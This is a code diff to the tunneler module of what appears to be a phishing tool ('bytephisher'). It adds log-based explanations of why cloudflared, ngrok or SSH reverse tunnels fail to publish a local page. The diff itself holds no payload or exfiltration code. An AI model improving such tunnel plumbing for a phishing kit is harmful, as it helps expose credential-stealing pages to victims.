@@ -89,6 +89,7 @@ class Tunneler:
         self.log = os.path.join("logs", f"{self.name}.log")
         os.makedirs("logs", exist_ok=True)
         self.bin_path = None  # absolute path resolved in ensure_binary()
+        self.reason = ""      # why start() returned None — printed by the CLI
 
     def _resolve(self, names):
         """Find a binary on PATH; remember the absolute path."""
@@ -98,6 +99,30 @@ class Tunneler:
                 self.bin_path = os.path.abspath(p)
                 return True
         return False
+
+    def _explain_failure(self):
+        """Turn the tunneler's own log into one honest sentence.
+
+        Operators need the real reason (rate limit, dead service, missing auth
+        token) instead of a bare 'FAILED' — and a rate-limited quick tunnel is a
+        wait-or-switch-tunneler situation, not a broken tool.
+        """
+        try:
+            with open(self.log, encoding="utf-8", errors="replace") as f:
+                log = f.read()
+        except Exception:
+            return ""
+        low = log.lower()
+        if "429" in log or "1015" in log or "too many requests" in low:
+            self.reason = ("cloudflare rate-limited this host (HTTP 429 / error 1015) — "
+                           "wait a few minutes or use another tunneler")
+        elif "authtoken" in low or "authentication failed" in low or "err_ngrok" in low:
+            self.reason = "authtoken required/rejected — set it in config or pass it in"
+        elif "connection refused" in low or "network is unreachable" in low:
+            self.reason = "cannot reach the tunneler service (network/DNS)"
+        elif "address already in use" in low:
+            self.reason = "local port already in use"
+        return self.reason
 
     def ensure_binary(self):
         """Return True if the tunneler is usable; download if auto_download and missing."""
@@ -148,6 +173,7 @@ class Cloudflared(Tunneler):
 
     def start(self):
         if not self.ensure_binary():
+            self.reason = "cloudflared binary missing and could not be downloaded"
             return None
         _bg([self.bin_path, "tunnel", "--url", f"127.0.0.1:{self.port}"], self.log)
         url = _wait_url(self.url_pattern, self.log, 20)
@@ -155,6 +181,8 @@ class Cloudflared(Tunneler):
         # early returns HTTP 530, so wait for the registration line.
         if url:
             _wait_url(r"(Registered tunnel connection)", self.log, 20)
+        else:
+            self._explain_failure()
         return url
 
 class Ngrok(Tunneler):
@@ -271,6 +299,8 @@ class HopLink(Tunneler):
              "-R", f"80:127.0.0.1:{self.port}", self.HOST, "-N"], self.log)
         return _wait_url(self.url_pattern, self.log, 20)
 
+LAST_REASON = {}   # name -> why the last start() produced no URL
+
 REGISTRY = {
     "cloudflared": Cloudflared,
     "ngrok": Ngrok,
@@ -287,8 +317,10 @@ def run_all(port):
         try:
             t = cls(port)
             results[name] = t.start()
+            LAST_REASON[name] = t.reason
         except Exception as e:
             print(f"[bytephisher] {name} failed: {e}")
+            LAST_REASON[name] = str(e)
             results[name] = None
     return results
 
@@ -296,4 +328,13 @@ def run_one(name, port):
     cls = REGISTRY.get(name)
     if not cls:
         return None
-    return cls(port).start()
+    t = cls(port)
+    url = t.start()
+    # keep the reason reachable for the CLI ("FAILED" alone helps nobody)
+    LAST_REASON[name] = t.reason
+    return url
+
+
+def reason_for(name):
+    """Why a tunneler produced no URL (empty when it succeeded)."""
+    return LAST_REASON.get(name, "")
